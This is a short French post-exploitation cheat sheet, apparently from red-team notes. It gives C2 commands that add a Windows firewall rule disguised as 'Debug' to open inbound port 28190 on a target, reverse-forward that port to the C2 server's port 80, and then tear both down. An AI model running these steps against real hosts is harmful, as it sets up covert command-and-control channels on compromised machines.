

1. Créer une règle de pare feu sur la target (autorise le port 28190 en trafic entrant)

```
run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190
```

2. créer un reverse port forwarding redirigeant le trafic arrivant sur le port 28190 de la targetvers le port 80 du C2.

```
rportfwd 28190 localhost 80
```


Arreter le reverse port forwarding

```
rportfwd stop 28190
```

Supprimer la règle de firewall

```
run netsh advfirewall firewall delete rule name="Debug"
```

